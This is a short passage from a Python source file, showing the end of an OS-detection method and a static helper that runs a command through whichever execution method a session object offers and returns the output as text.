        return 'windows'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''